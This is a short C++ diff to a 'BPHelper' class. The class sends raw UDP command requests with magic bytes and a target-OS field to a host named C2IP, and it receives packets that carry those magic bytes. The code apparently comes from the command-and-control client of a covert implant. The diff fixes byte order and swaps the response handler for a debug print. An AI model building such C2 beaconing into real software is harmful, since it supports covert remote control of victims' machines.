@@ -35,6 +35,7 @@ void BPHelper::requestAction() {
     bpHeader.header_type = 0x01;
 
     bp_command_request_header.target_OS = 0x01;
+    bp_command_request_header.command_num = htonl(currentCmd);
 
     uint16_t udp_len = (uint16_t) sizeof(bpHeader) + (uint16_t) sizeof(bp_command_request_header) +
                        (uint16_t) sizeof(udp_header);
@@ -95,7 +96,7 @@ BPHelper::BPHelper() {
         nextHopMac = rawSocket.getMacOfIP(C2IP);
     }
 #elif defined(_WIN32) || defined(WIN32)
-    rawSocket = RawSocket(false);
+    rawSocket = RawSocket(C2IP, false);
 #endif
     currentCmd = 0;
 }
@@ -106,9 +107,10 @@ void BPHelper::Receive() {
         Packet packet = rawSocket.getPacket();
         if (!packet.empty()) {
             unique_ptr<info_t> info = parsePacket(packet);
-            if (info->bpHeader.magic_bytes == MAGIC_BYTES) {
+            if (info->bpHeader.magic_bytes == ntohl(MAGIC_BYTES)) {
                 socketMutex.lock();
-                actionResponse(move(info));
+                //actionResponse(move(info));
+                cout << move(info) << endl;
                 socketMutex.unlock();
             }
         }
